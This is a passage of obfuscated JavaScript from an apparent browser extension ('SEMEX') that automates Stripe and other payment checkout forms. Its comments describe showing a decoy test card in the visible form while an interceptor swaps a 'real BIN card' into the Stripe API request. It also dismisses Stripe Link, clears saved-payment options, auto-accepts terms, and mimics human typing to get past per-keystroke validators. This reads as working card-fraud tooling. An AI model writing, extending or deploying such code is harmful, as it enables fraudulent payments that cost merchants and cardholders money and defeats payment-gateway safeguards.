      if (["country", "state", "cardRadio", "cardHeader", "cardContainer", "stripePass", "terms"].includes(_0x4a3c8b)) {
        continue;
      }
      const _0x51ee83 = _0xe0821a[_0x4a3c8b];
      const _0x52a162 = _0x5c61c9[_0x4a3c8b];
      if (_0x51ee83 && _0x52a162) {
        // Shadow-aware: fillComponentFrame handles component frames where inputs
        // may live inside open shadow roots (Braintree Hosted Fields, Adyen
        // Drop-in) — a flat querySelector gate would skip them silently.
        if (_semexDeepQuery(_0x51ee83)) {
          await fill(_0x51ee83, _0x52a162);
        }
      }
    }
    // Validate required card fields before reporting completion.
    // When the gateway uses separate month/year inputs (separateExpiry:true)
    // the selector block has no "expiry" key; check expMonth+expYear instead.
    const _semexCFHasSeparateExpiry = !_0xe0821a.expiry && (_0xe0821a.expMonth || _0xe0821a.expYear);
    const _semexCFRequired = [
      { key: "cardNumber", label: "cardNumber" },
      ...(_semexCFHasSeparateExpiry
        ? [{ key: "expMonth", label: "expMonth" }, { key: "expYear", label: "expYear" }]
        : [{ key: "expiry",   label: "expiry"   }]),
      { key: "cvv",        label: "cvv" },
    ];
    const _semexCFMissing = [];
    for (const _semexRc of _semexCFRequired) {
      const _semexSel = _0xe0821a[_semexRc.key];
      if (!_semexSel) {
        _semexCFMissing.push(_semexRc.label);
      } else {
        try {
          const _semexEl = _semexDeepQuery(_semexSel);
          if (!_semexEl || !(_semexEl.value || "").trim()) {
            _semexCFMissing.push(_semexRc.label);
          }
        } catch (_semexQE) {
          _semexCFMissing.push(_semexRc.label);
        }
      }
    }
    if (_semexCFMissing.length > 0) {
      _semexCFFillOk = false;
      _semexCFFillError = "empty_fields:" + _semexCFMissing.join(",");
    } else {
      _semexCFFillOk = true;
      _semexCFFillError = null;
    }
  } catch (_semexCFEx) {
    _semexCFFillOk = false;
    _semexCFFillError = "exception";
  }
  const _0x2dd0b3 = document.getElementById("semex-overlay");
  if (_0x2dd0b3 && _0x2dd0b3.hasAttribute("data-semex-live")) {
    window.postMessage({
      type: "SEMEX_FILL_FORM_COMPLETE",
      ok: _semexCFFillOk,
      error: _semexCFFillOk ? undefined : _semexCFFillError
    }, "*");
  }
  // Return validated result so fillForm → fillFormFromOverlay can gate
  // done-state marking on actual fill success.
  return { ok: _semexCFFillOk, error: _semexCFFillError };
}
__name(fillComponentFrame, "fillComponentFrame");

/* ============================================================
 * SELECTOR-FREE KEYBOARD FALLBACK FILL (decoded from Pixel Zero)
 * ============================================================
 * Their "works on any page" trick: instead of relying on per-UI selectors,
 * click the field's visual center (elementFromPoint) and drive per-character
 * keydown/keypress/InputEvent(insertText)/keyup at document.activeElement.
 * Used here ONLY as a last resort inside Stripe-hosted frames when every
 * canonical selector missed (unknown/new Stripe UI variant), so no Stripe
 * surface ever dead-ends the fill.
 * ============================================================ */
function _semexKbVisible(_el) {
  try {
    if (!_el) return false;
    const _r = _el.getBoundingClientRect();
    if (!_r || _r.width < 2 || _r.height < 2) return false;
    const _cs = window.getComputedStyle(_el);
    return !!_cs && _cs.display !== "none" && _cs.visibility !== "hidden" && parseFloat(_cs.opacity || "1") > 0;
  } catch (_e) { return false; }
}

async function _semexKbClickAndType(_el, _text) {
  const _sl = (_ms) => new Promise(_r => setTimeout(_r, _ms));
  try { _el.scrollIntoView({ block: "center", inline: "center" }); } catch (_e0) {}
  await _sl(30);
  // Click the field's visual center — elementFromPoint finds the real click
  // target even when a label/overlay div sits on top of the input.
  try {
    const _r = _el.getBoundingClientRect();
    const _cx = _r.left + _r.width / 2, _cy = _r.top + _r.height / 2;
    const _hit = document.elementFromPoint(_cx, _cy) || _el;
    const _mo = { bubbles: true, cancelable: true, clientX: _cx, clientY: _cy };
    _hit.dispatchEvent(new MouseEvent("pointerdown", _mo));
    _hit.dispatchEvent(new MouseEvent("mousedown", _mo));
    try { _hit.focus(); } catch (_eF) {}
    _hit.dispatchEvent(new MouseEvent("mouseup", _mo));
    _hit.dispatchEvent(new MouseEvent("click", _mo));
  } catch (_e1) { try { _el.focus(); } catch (_e2) {} }
  await _sl(40);
  const _tgt = () => {
    try {
      const _ae = document.activeElement;
      return (_ae && _ae !== document.body && _ae.tagName !== "HTML") ? _ae : _el;
    } catch (_e) { return _el; }
  };
  for (const _ch of String(_text)) {
    const _t = _tgt();
    const _ko = {
      key: _ch,
      code: (_ch >= "0" && _ch <= "9") ? "Digit" + _ch : "Key" + _ch.toUpperCase(),
      charCode: _ch.charCodeAt(0), keyCode: _ch.charCodeAt(0), which: _ch.charCodeAt(0),
      bubbles: true, cancelable: true
    };
    try { _t.dispatchEvent(new KeyboardEvent("keydown", _ko)); } catch (_e3) {}
    try { _t.dispatchEvent(new KeyboardEvent("keypress", _ko)); } catch (_e4) {}
    try {
      // Synthetic events never mutate .value (untrusted) — mirror each
      // keystroke through the native value setter, then fire InputEvent
      // (insertText) so React/Stripe handlers see a real per-char edit.
      const _proto = _t instanceof HTMLTextAreaElement ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
      const _desc = Object.getOwnPropertyDescriptor(_proto, "value");
      if (_desc && _desc.set) _desc.set.call(_t, (_t.value || "") + _ch); else _t.value = (_t.value || "") + _ch;
      _t.dispatchEvent(new InputEvent("input", { data: _ch, inputType: "insertText", bubbles: true, cancelable: true }));
    } catch (_e5) {}
    try { _t.dispatchEvent(new KeyboardEvent("keyup", _ko)); } catch (_e6) {}
    await _sl(6);
  }
  try { _tgt().dispatchEvent(new Event("change", { bubbles: true })); } catch (_e7) {}
}

async function _semexKeyboardFallbackFill(_neededKeys, _values) {
  // Gate to Stripe-hosted frames: only there is the DOM guaranteed to be a
  // Stripe card form, so lone-input and autocomplete heuristics are safe.
  const _h = (location.hostname || "").toLowerCase();
  if (!(_h === "js.stripe.com" || _h === "m.stripe.com" || _h.endsWith(".stripe.com"))) return;
  const _inputs = Array.from(document.querySelectorAll("input:not([type=hidden]):not([type=checkbox]):not([type=radio])")).filter(_semexKbVisible);
  if (!_inputs.length) return;
  const _attr = (_el) => [_el.getAttribute("autocomplete"), _el.name, _el.id, _el.placeholder, _el.getAttribute("aria-label")]
    .filter(Boolean).join(" ").toLowerCase();
  const _filled = [];
  const _pickFor = (_key) => {
    if (_key === "cardNumber") return _inputs.find(_i => /cc-number|cardnumber|card number|\bnumber\b/.test(_attr(_i))) || null;
    if (_key === "expiry" || _key === "expMonth" || _key === "expYear") return _inputs.find(_i => /cc-exp|expir|\bexp\b|mm\s*\/\s*y/.test(_attr(_i))) || null;
    if (_key === "cvv") return _inputs.find(_i => /cc-csc|\bcvc\b|\bcvv\b|security code/.test(_attr(_i))) || null;
    return null;
  };
  for (const _key of _neededKeys) {
    let _val = _values[_key];
    if (!_val && _key === "expiry" && _values.expMonth && _values.expYear) {
      _val = _values.expMonth + "/" + _values.expYear;
    }
    if (!_val) continue;
    let _el = _pickFor(_key);
    // Classic Stripe Elements v3 renders ONE field per iframe — when the frame
    // has a single visible input and exactly one missing field, that input IS
    // the field. (Guarded to single-missing-field so two fields never collide
    // into the same input.)
    if (!_el && _inputs.length === 1 && _neededKeys.length === 1) _el = _inputs[0];
    if (!_el) continue;
    await _semexKbClickAndType(_el, _key === "cardNumber" ? String(_val).replace(/\s/g, "") : String(_val));
    // Verify the value actually landed before crediting the field — callers
    // use this list to excuse selector-less fields from the missing-check.
    try {
      if (((_el.value || "").trim()).length >= 2) _filled.push(_key);
    } catch (_eV) {}
  }
  return _filled;
}

async function executeFillSequence(_0x2a7b99, _0xec3d33, _semexOpts) {
  var _0x32765c;
  const _semexSkipCardValidation = !!(_semexOpts && _semexOpts.skipCardValidation);
  // Tracks whether all required card fields were actually filled.
  // Set to false (with a descriptive error) if any required field stays empty
  // after the fill loop so the overlay can surface the failure instead of
  // silently succeeding.
  // Start FAIL-CLOSED: if an exception escapes the try block before the
  // post-fill validation runs, the finally block posts ok:false / "exception"
  // rather than silently succeeding with the initial true value.
  let _semexFillOk = false, _semexFillError = "exception";
  // NOTE: the old 1.2-second early-completion timer that fired a bare
  // SEMEX_FILL_FORM_COMPLETE here has been removed. It raced with the
  // post-fill validation in the finally block: on a slow fill the timer
  // always fired first, the overlay resolved it as success (ok was
  // undefined ≠ false), and submitted the form before validation ran.
  // The overlay already has a 15-second timeout as its own backstop.
  // Completion is now emitted ONLY from the finally block after validation.
  try {
    // Fast-path: if a card number input is already visible in this document,
    // Stripe Link has NOT intercepted the form — skip the 2500ms poll entirely.
    // The poll only matters when Link hides card fields behind its overlay.
    const _semexCardAlreadyVisible = (() => {
      const _semexCNSels = [
        "#Field-numberInput", "#cardNumber",
        "[data-elements-stable-field-name='cardNumber']",
        "input[autocomplete='cc-number']",
      ];
      return _semexCNSels.some(function(_s) {
        try {
          const _el = document.querySelector(_s);
          if (!_el) return false;
          const _cs = window.getComputedStyle(_el);
          return _cs.display !== "none" && _cs.visibility !== "hidden";
        } catch (_e) { return false; }
      });
    })();
    if (!_semexCardAlreadyVisible) {
      // On new Stripe UI (/g/pay/), executeFillSequence runs inside the
      // elements-inner iframe. The "Pay without Link" button may be in a
      // SIBLING js.stripe.com frame (e.g. the Link authenticate frame), so
      // searching this iframe's document finds nothing and the fill starts with
      // the Link overlay still blocking the card fields.
      // Fix: run the local poll AND concurrently ask the background to broadcast
      // CLICK_PAY_WITHOUT_LINK to sibling frames, so whichever frame holds the
      // button dismisses it before the fill writes to card inputs.
      if (!IS_MAIN_FRAME) {
        await Promise.all([
          clickPayWithoutLinkButton(),
          new Promise(function(_semexPwlRes) {
            try {
              chrome.runtime.sendMessage({ type: "CLICK_PAY_WITHOUT_LINK_SUBFRAMES" }, function() { _semexPwlRes(void 0); });
            } catch (_semexPwlE) { _semexPwlRes(void 0); }
          })
        ]);
      } else {
        await clickPayWithoutLinkButton();
      }
    }
    await dismissStripeLinkSavedPayment();
    let _0x9145ac = false;
    try {
      if (_0x2a7b99.cardContainer) {
        let _0x2d6d65 = document.querySelector(_0x2a7b99.cardContainer);
        // New-UI: the cardContainer selector falls back to the FIRST accordion
        // item, but payment-method ordering is conditional (wallets/Link can
        // sort before Card). Re-resolve to the item that actually carries the
        // card identity — card-brand icons or a "Card" label — so we never
        // open/click a non-card method.
        if (_0x2d6d65 && _0x2d6d65.classList && _0x2d6d65.classList.contains("p-AccordionItem")) {
          const _semexWrapper = _0x2d6d65.closest('[data-testid="payment-accordion-wrapper"]');
          // Match any card-brand icon testid (visa, mastercard, amex, discover,
          // jcb, diners, unionpay, maestro, elo, cartes_bancaires, etc.) so a
          // Mastercard-only or Amex-only checkout is not mis-identified.
          const _semexCardBrandTids = ["visa","mastercard","amex","discover","jcb","diners","unionpay","maestro","elo","cartes_bancaires","rupay","troy","girocard","eftpos_au"];
          const _semexIsCard = _0x994515 => !!(_semexCardBrandTids.some(function(_br){ try { return !!_0x994515.querySelector('[data-testid="' + _br + '"]'); } catch(_e){ return false; } }) || /^card/i.test((_0x994515.textContent || "").trim()));
          if (_semexWrapper && !_semexIsCard(_0x2d6d65)) {
            const _semexItems = _semexWrapper.querySelectorAll(".p-AccordionItem");
            for (const _semexIt of _semexItems) {
              if (_semexIsCard(_semexIt)) {
                _0x2d6d65 = _semexIt;
                break;
              }
            }
          }
        }
        if (_0x2d6d65) {
          // New-UI marks the selected method with AccordionItem--selected /
          // p-AccordionItem--selected — treat that as "already open" so we
          // don't click the header again and risk collapsing the card form.
          const _0x2d1d68 = _0x2d6d65.getAttribute("data-state") === "open" || _0x2d6d65.classList.contains("AccordionItem--open") || _0x2d6d65.classList.contains("PaymentMethodFormAccordionItem--selected") || _0x2d6d65.classList.contains("AccordionItem--selected") || _0x2d6d65.classList.contains("p-AccordionItem--selected");
          if (_0x2d1d68) {
            _0x9145ac = true;
          } else {
            const _0x466add = _0x2d6d65.querySelector("input[type=\"radio\"]");
            if (_0x466add) {
              _0x466add.click();
              _0x9145ac = true;
              await sleep(80);
            }
            const _0x4e5da3 = _0x2d6d65.querySelector("button") || _0x2d6d65.querySelector("[role=\"button\"]") || _0x2d6d65.querySelector(_0x2a7b99.cardHeader);
            if (_0x4e5da3) {
              _0x4e5da3.click();
              _0x9145ac = true;
              await sleep(120);
            }
          }
        }
      }
      if (!_0x9145ac) {
        if (_0x2a7b99.cardRadio) {
          const _0xd94db = document.querySelector(_0x2a7b99.cardRadio);
          if (_0xd94db) {
            _0xd94db.click();
            _0x9145ac = true;
            await sleep(80);
          }
        }
        if (!_0x9145ac && _0x2a7b99.cardHeader) {
          const _0xcd4c6a = document.querySelector(_0x2a7b99.cardHeader);
          if (_0xcd4c6a) {
            _0xcd4c6a.click();
            _0x9145ac = true;
            await sleep(120);
          }
        }
      }
    } catch (_0x4b3bf4) {}
    // New-UI mounts the card inputs lazily AFTER the accordion expands (the
    // accordion shell — which satisfies the form-present probe — renders
    // first). If the card field isn't there yet, wait for it before filling
    // instead of silently skipping the whole card.
    if (_0x2a7b99.cardNumber && !document.querySelector(_0x2a7b99.cardNumber)) {
      await waitForElement(_0x2a7b99.cardNumber, 3000);
    }
    if (_0x2a7b99.country && _0xec3d33.country) {
      const _0x36d482 = await fill(_0x2a7b99.country, _0xec3d33.country);
      if (_0x36d482) {
        if (_0x2a7b99.state) {
          // Diagnostic only — 100ms is enough to detect a field that renders
          // synchronously after country fill. Longer timeouts were wasting up to
          // 1s per field on forms that never have these fields.
          const _0x35bba4 = await waitForElement(_0x2a7b99.state, 100);
          logOnce("state_check_" + (_0x35bba4 ? "found" : "missing"), "[SEMEX] State field:", _0x35bba4 ? "Found" : "Not Found");
        }
        if (_0x2a7b99.zip) {
          const _0x2b4843 = await waitForElement(_0x2a7b99.zip, 100);
          logOnce("zip_check_" + (_0x2b4843 ? "found" : "missing"), "[SEMEX] Zip field:", _0x2b4843 ? "Found" : "Not Found");
        }
        if (_0x2a7b99.city) {
          const _0x3ed30e = await waitForElement(_0x2a7b99.city, 100);
          logOnce("city_check_" + (_0x3ed30e ? "found" : "missing"), "[SEMEX] City field:", _0x3ed30e ? "Found" : "Not Found");
        }
        if (_0x2a7b99.address) {
          const _0x3777fc = await waitForElement(_0x2a7b99.address, 100);
          logOnce("addr_check_" + (_0x3777fc ? "found" : "missing"), "[SEMEX] Address Line 1 field:", _0x3777fc ? "Found" : "Not Found", _0x2a7b99.address);
        }
        if (_0x2a7b99.address2) {
          const _0x10b679 = await waitForElement(_0x2a7b99.address2, 100);
        }
      }
    }
    if (_0x2a7b99.state && _0xec3d33.state) {
      await fill(_0x2a7b99.state, _0xec3d33.state);
      await sleep(40);
    }
    // Visible-decoy pre-fill: form shows a harmless test card; interceptor swaps
    // the real BIN card into the Stripe API call before it leaves the browser.
    if (_0x2a7b99.cardNumber && _0xec3d33.cardNumber) {
      const _semexTCEl = document.querySelector(_0x2a7b99.cardNumber);
      if (_semexTCEl) {
        await setFormValue(_semexTCEl, "4111111111111111");
        if (_0x2a7b99.expiry) {
          const _semexTCExpEl = document.querySelector(_0x2a7b99.expiry);
          if (_semexTCExpEl) await setFormValue(_semexTCExpEl, "12/30");
        }
        if (_0x2a7b99.cvv) {
          const _semexTCCvvEl = document.querySelector(_0x2a7b99.cvv);
          if (_semexTCCvvEl) await setFormValue(_semexTCCvvEl, "123");
        }
        await sleep(280);
      }
    }
    // Exclude card fields from the main fill loop — visible fields keep the
    // test card; the interceptor already holds the real BIN card to swap in.
    const _0x352622 = Object.keys(_0x2a7b99).filter(_0x1643d1 => !["country", "state", "cardRadio", "cardHeader", "cardContainer", "stripePass", "terms", "email", "cardNumber", "expiry", "cvv", "expMonth", "expYear"].includes(_0x1643d1));
    for (const _0x46d408 of _0x352622) {
      const _0x4dadc3 = _0x2a7b99[_0x46d408];
      const _0x3a27e6 = _0xec3d33[_0x46d408];
      if (_0x4dadc3 && _0x3a27e6) {
        const _0x55131c = await fill(_0x4dadc3, _0x3a27e6);
        if (_0x55131c) {
          await sleep(15);
        }
      }
    }
    if (_0x2a7b99.email && _0xec3d33.email) {
      const _0x459c09 = document.querySelector(_0x2a7b99.email);
      if (_0x459c09) {
        const _0x1e9575 = ((_0x32765c = _0x459c09.value) == null ? undefined : _0x32765c.trim()) || "";
        if (!_0x1e9575 || _0x1e9575 === "" || _0x1e9575 === _0x459c09.placeholder) {
          await fill(_0x2a7b99.email, _0xec3d33.email);
        }
      }
    }
    if (_0x2a7b99.stripePass) {
      const _0xfef468 = document.querySelector(_0x2a7b99.stripePass);
      if (_0xfef468 && _0xfef468.checked) {
        _0xfef468.click();
      }
    }
    if (_0x2a7b99.terms) {
      const _0x1fe9f2 = document.querySelector(_0x2a7b99.terms);
      if (_0x1fe9f2 && !_0x1fe9f2.checked) {
        _0x1fe9f2.click();
      }
    }
    // ── Post-fill validation ──────────────────────────────────────────────────
    // After all fields have been filled, verify that the three required card
    // fields (cardNumber, expiry, cvv) actually contain a non-empty value.
    // A selector failure (element not found, renamed ID, wrong frame) leaves
    // the field blank and the fill silently appears to succeed.  Catch that
    // here so the overlay can surface the error to the operator before submit.
    // When the gateway uses separate month/year inputs (separateExpiry:true —
    // e.g. Recurly, Xsolla) the selector block has no "expiry" key but does
    // have "expMonth" and "expYear".  Require both of those instead so a blank
    // year field isn't hidden behind a passing "expiry" check.
    const _semexHasSeparateExpiry = !_0x2a7b99.expiry && (_0x2a7b99.expMonth || _0x2a7b99.expYear);
    // skipCardValidation (Whop/Basis Theory top-frame pass): card fields were
    // deliberately stripped because they live in cross-origin subframes.
    const _semexRequiredChecks = _semexSkipCardValidation ? [] : [
      { key: "cardNumber", label: "cardNumber" },
      ...(_semexHasSeparateExpiry
        ? [{ key: "expMonth", label: "expMonth" }, { key: "expYear", label: "expYear" }]
        : [{ key: "expiry",   label: "expiry"   }]),
      { key: "cvv",        label: "cvv" },
    ];
    const _semexMissing = [];
    for (const _semexRc of _semexRequiredChecks) {
      const _semexSel = _0x2a7b99[_semexRc.key];
      if (!_semexSel) {
        // Absent/falsy selector means the field was never targetable — treat
        // as missing rather than silently skipping the check and reporting ok.
        _semexMissing.push(_semexRc.label);
      } else {
        try {
          // Shadow-aware: without this an already-filled shadow-root card is
          // misclassified as empty and needlessly cleared/retyped by the retry.
          const _semexEl = _semexDeepQuery(_semexSel);
          if (!_semexEl || !(_semexEl.value || "").trim()) {
            _semexMissing.push(_semexRc.label);
          }
        } catch (_semexQE) {
          // Invalid selector — treat as missing
          _semexMissing.push(_semexRc.label);
        }
      }
    }
    if (_semexMissing.length > 0) {
      // RETRY once before declaring failure: some gateways reject the bulk
      // paste (per-keystroke validators, shadow-root inputs found late). Card
      // number gets digit-by-digit human typing; other fields get one more
      // setFormValue pass through the shadow-root-aware resolver.
      for (const _semexRc2 of _semexRequiredChecks) {
        if (_semexMissing.indexOf(_semexRc2.label) === -1) continue;
        const _semexSel2 = _0x2a7b99[_semexRc2.key];
        if (!_semexSel2) continue;
        const _semexEl2 = _semexDeepQuery(_semexSel2);
        if (!_semexEl2) continue;
        let _semexVal2 = _0xec3d33[_semexRc2.key];
        if (!_semexVal2 && _semexRc2.key === "expiry" && _0xec3d33.expMonth && _0xec3d33.expYear) {
          _semexVal2 = _0xec3d33.expMonth + "/" + _0xec3d33.expYear;
        }
        if (!_semexVal2) continue;
        if (_semexRc2.key === "cardNumber") {
          await typeFieldHumanlike(_semexEl2, String(_semexVal2).replace(/\s/g, ""));
        } else {
          await setFormValue(_semexEl2, _semexVal2);
        }
      }
      // Re-validate after the retry pass.
      const _semexStillMissing = [];
      for (const _semexRc3 of _semexRequiredChecks) {
        const _semexSel3 = _0x2a7b99[_semexRc3.key];
        if (!_semexSel3) { _semexStillMissing.push(_semexRc3.label); continue; }
        try {
          const _semexEl3 = _semexDeepQuery(_semexSel3);
          if (!_semexEl3 || !(_semexEl3.value || "").trim()) _semexStillMissing.push(_semexRc3.label);
        } catch (_semexQE3) { _semexStillMissing.push(_semexRc3.label); }
      }
      _semexMissing.length = 0;
      _semexMissing.push(..._semexStillMissing);
    }
    if (_semexMissing.length > 0) {
      // SELECTOR-FREE LAST RESORT (Pixel Zero technique): canonical selectors
      // + retry both missed — click-and-type directly into Stripe-frame inputs
      // discovered by autocomplete/name heuristics (or the lone input of a
      // classic Elements iframe). Runs only on Stripe-hosted frames. Returns
      // the keys it verifiably filled.
      let _semexKbFilled = [];
      try {
        const _semexKbKeys = _semexRequiredChecks
          .filter(_rc => _semexMissing.indexOf(_rc.label) !== -1)
          .map(_rc => _rc.key);
        if (_semexKbKeys.length) {
          _semexKbFilled = (await _semexKeyboardFallbackFill(_semexKbKeys, _0xec3d33)) || [];
        }
      } catch (_eKbFallback) {}
      // Final re-validation after the keyboard fallback. STRICT: a field only
      // passes if its selector now resolves to a non-empty input, OR the
      // keyboard fallback verified it filled that exact field. Never excuse a
      // field just because some unrelated input on the page has text.
      const _semexKbStillMissing = [];
      for (const _semexRc4 of _semexRequiredChecks) {
        const _semexSel4 = _0x2a7b99[_semexRc4.key];
        try {
          const _semexEl4 = _semexSel4 ? _semexDeepQuery(_semexSel4) : null;
          if (_semexEl4 && (_semexEl4.value || "").trim()) continue;
          if (!_semexEl4 && _semexKbFilled.indexOf(_semexRc4.key) !== -1) continue;
          _semexKbStillMissing.push(_semexRc4.label);
        } catch (_semexQE4) { _semexKbStillMissing.push(_semexRc4.label); }
      }
      _semexMissing.length = 0;
      _semexMissing.push(..._semexKbStillMissing);
    }
    if (_semexMissing.length > 0) {
      _semexFillOk = false;
      _semexFillError = "empty_fields:" + _semexMissing.join(",");
    } else {
      // All required fields filled — mark success. Explicit set because
      // _semexFillOk starts false (fail-closed) so we must opt in here.
      _semexFillOk = true;
      _semexFillError = null;
    }
  } finally {
    const _0x13c07f = document.getElementById("semex-overlay");
    if (_0x13c07f && _0x13c07f.hasAttribute("data-semex-live")) {
      window.postMessage({
        type: "SEMEX_FILL_FORM_COMPLETE",
        ok: _semexFillOk,
        error: _semexFillOk ? undefined : _semexFillError
      }, "*");
    } else {
      // Cross-origin Stripe iframe (new UI): the overlay lives in the TOP frame,
      // so a local postMessage goes nowhere and the overlay would hang on
      // "Waiting response..." forever. Relay completion via the background so
      // the top frame can notify the overlay.
      try {
        chrome.runtime.sendMessage({
          type: "SEMEX_FILL_FORM_COMPLETE_RELAY",
          ok: _semexFillOk,
          error: _semexFillOk ? undefined : _semexFillError
        }, () => { void chrome.runtime.lastError; });
      } catch (_eRel) {}
    }
  }
  // Return the validated fill result so callers (fillForm → fillFormFromOverlay)
  // can gate state-marking on an actual success rather than assuming ok:true.
  return { ok: _semexFillOk, error: _semexFillError };
}
__name(executeFillSequence, "executeFillSequence");
const sleep = __name(_0x522bb0 => new Promise(_0x1b6560 => setTimeout(_0x1b6560, _0x522bb0)), "sleep");
// Shadow-root-aware querySelector (ported from Jetix form-handler). Modern
// payment components (Braintree Hosted Fields, newer Adyen Drop-in) render
// their inputs inside open shadow roots that document.querySelector() cannot
// pierce — those fields silently missed every fill. Falls back to walking all
// elements and querying their shadowRoot when the flat lookup finds nothing.
function _semexDeepQuery(_sel) {
  try {
    const _flat = document.querySelector(_sel);
    if (_flat) return _flat;
  } catch (_e) { return null; }
  // Recursive: payment components can nest shadow roots (Drop-in inside a
  // host inside a wrapper), so walk each shadow root's subtree too.
  const _walk = (_root) => {
    try {
      const _all = _root.querySelectorAll("*");
      for (let _i = 0; _i < _all.length; _i++) {
        const _sr = _all[_i].shadowRoot;
        if (_sr) {
          const _hit = _sr.querySelector(_sel);
          if (_hit) return _hit;
          const _nested = _walk(_sr);
          if (_nested) return _nested;
        }
      }
    } catch (_e2) {}
    return null;
  };
  return _walk(document);
}
__name(_semexDeepQuery, "semexDeepQuery");
const fill = __name(async (_0x4e5c40, _0x1e3e7b) => {
  if (!_0x4e5c40 || !_0x1e3e7b) {
    return false;
  }
  let _0x38f63c = _semexDeepQuery(_0x4e5c40);
  if (_0x38f63c) {
    await setFormValue(_0x38f63c, _0x1e3e7b);
    return true;
  }
  return false;
}, "fill");
async function setFormValue(_0x1ac7f4, _0x3d8594) {
  var _0x511ac7;
  var _0x484ff3;
  if (!_0x1ac7f4) {
    return;
  }
  try {
    const _0x149039 = _0x1ac7f4.value || "";
    const _0x193896 = String(_0x3d8594 || "");
    if (_0x149039 === _0x193896) {
      return;
    }
    if (_0x149039.replace(/\s/g, "") === _0x193896.replace(/\s/g, "")) {
      return;
    }
  } catch (_0x2de84e) {}
  const _0x27e983 = _0x1ac7f4.name && (_0x1ac7f4.name.toLowerCase().includes("cvv") || _0x1ac7f4.name.toLowerCase().includes("cvc") || _0x1ac7f4.name.toLowerCase().includes("security") || _0x1ac7f4.name.toLowerCase().includes("verification")) || _0x1ac7f4.id && (_0x1ac7f4.id.toLowerCase().includes("cvv") || _0x1ac7f4.id.toLowerCase().includes("cvc"));
  // v2.9.9: true instant fill — per-field waits cut to a single tick. Stripe
  // only needs the event sequence, not human pacing; CVV keeps a tiny settle.
  const _0xca0221 = _0x27e983 ? 3 : 0;
  const _0x437639 = _0x27e983 ? 3 : 1;
  const _0x20f0f3 = _0x27e983 ? 2 : 0;
  const _0x4e7885 = _0x27e983 ? 2 : 1;
  _0x1ac7f4.focus();
  await sleep(_0xca0221);
  if (_0x1ac7f4.tagName === "INPUT") {
    _0x1ac7f4.setAttribute("autocomplete", "off");
    _0x1ac7f4.setAttribute("data-autocomplete", "off");
  }
  if (_0x1ac7f4.tagName === "SELECT") {
    fillSelect(_0x1ac7f4, _0x3d8594);
    return;
  }
  let _0xb37524 = null;
  if (_0x1ac7f4.tagName === "INPUT") {
    _0xb37524 = (_0x511ac7 = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")) == null ? undefined : _0x511ac7.set;
  } else if (_0x1ac7f4.tagName === "TEXTAREA") {
    _0xb37524 = (_0x484ff3 = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")) == null ? undefined : _0x484ff3.set;
  }
  if (_0xb37524) {
    _0xb37524.call(_0x1ac7f4, "");
  } else {
    _0x1ac7f4.value = "";
  }
  // Use InputEvent (not generic Event) so React 17/18's synthetic event system
  // receives the correct inputType. Generic Event('input') fires onChange but
  // React sees no inputType/data — Stripe's card number handler treats it as an
  // unrecognised programmatic event, resets the field after reconciliation, and
  // the payment attempt fires with an empty card number.
  // 'deleteContentBackward' mirrors a real backspace/delete keypress for the clear.
  try {
    _0x1ac7f4.dispatchEvent(new InputEvent("input", {
      bubbles: true,
      inputType: "deleteContentBackward"
    }));
  } catch (_eIE0) {
    _0x1ac7f4.dispatchEvent(new Event("input", { bubbles: true }));
  }
  _0x1ac7f4.dispatchEvent(new Event("keydown", {
    bubbles: true,
    key: "Backspace"
  }));
  _0x1ac7f4.dispatchEvent(new Event("keyup", {
    bubbles: true,
    key: "Backspace"
  }));
  await sleep(_0x437639);
  if (_0xb37524) {
    _0xb37524.call(_0x1ac7f4, _0x3d8594);
  } else {
    _0x1ac7f4.value = _0x3d8594;
  }
  // 'insertFromPaste' mirrors a clipboard paste — React/Stripe's onChange handler
  // validates and formats the full pasted value into its controlled state, which
  // survives reconciliation. Generic Event('input') has no data/inputType so
  // Stripe's formatter runs, finds nothing, and clears the field.
  const _semexFillData = String(_0x3d8594 || "");
  try {
    _0x1ac7f4.dispatchEvent(new InputEvent("input", {
      bubbles: true,
      cancelable: true,
      inputType: "insertFromPaste",
      data: _semexFillData
    }));
  } catch (_eIE1) {
    _0x1ac7f4.dispatchEvent(new Event("input", { bubbles: true, cancelable: true }));
  }
  await sleep(_0x20f0f3);
  _0x1ac7f4.dispatchEvent(new Event("keydown", {
    bubbles: true
  }));
  _0x1ac7f4.dispatchEvent(new Event("keypress", {
    bubbles: true
  }));
  _0x1ac7f4.dispatchEvent(new Event("keyup", {
    bubbles: true
  }));
  await sleep(_0x4e7885);
  _0x1ac7f4.dispatchEvent(new Event("change", {
    bubbles: true,
    cancelable: true
  }));
  _0x1ac7f4.dispatchEvent(new Event("blur", {
    bubbles: true
  }));
  try {
    const _0x150513 = new InputEvent("input", {
      bubbles: true,
      inputType: "insertFromPaste",
      data: _semexFillData
    });
    Object.defineProperty(_0x150513, "target", {
      value: _0x1ac7f4,
      enumerable: true
    });
    _0x1ac7f4.dispatchEvent(_0x150513);
  } catch (_0x1f02d5) {}
  _0x1ac7f4.blur();
}
__name(setFormValue, "setFormValue");
// Digit-by-digit typing (ported from Jetix form-handler). Some gateways attach
// per-keystroke validators that reject a bulk insertFromPaste — the field stays
// empty even though setFormValue ran. This types one character at a time with
// the full real-typing event choreography (keydown → keypress →
// InputEvent(insertText) → keyup), which those validators accept. Used ONLY as
// a retry when the standard fill left a required field empty — Stripe's proven
// paste path stays primary.
async function typeFieldHumanlike(_0xel, _0xrawVal) {
  try {
    if (!_0xel) return false;
    const _0xisCard = /card|number|pan/i.test((_0xel.name || "") + " " + (_0xel.id || "") + " " + (_0xel.getAttribute && _0xel.getAttribute("autocomplete") || ""));
    const _0xval = String(_0xrawVal || "");
    if (!_0xval) return false;
    const _0xsetDesc = _0xel.tagName === "INPUT" ? Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value") : Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value");
    const _0xset = _0xsetDesc && _0xsetDesc.set;
    _0xel.focus();
    if (_0xset) { _0xset.call(_0xel, ""); } else { _0xel.value = ""; }
    try { _0xel.dispatchEvent(new InputEvent("input", { bubbles: true, inputType: "deleteContentBackward" })); } catch (_eC) { _0xel.dispatchEvent(new Event("input", { bubbles: true })); }
    let _0xcur = "";
    for (let _0xi = 0; _0xi < _0xval.length; _0xi++) {
      const _0xch = _0xval[_0xi];
      const _0xcode = /^[0-9]$/.test(_0xch) ? "Digit" + _0xch : "Key" + _0xch.toUpperCase();
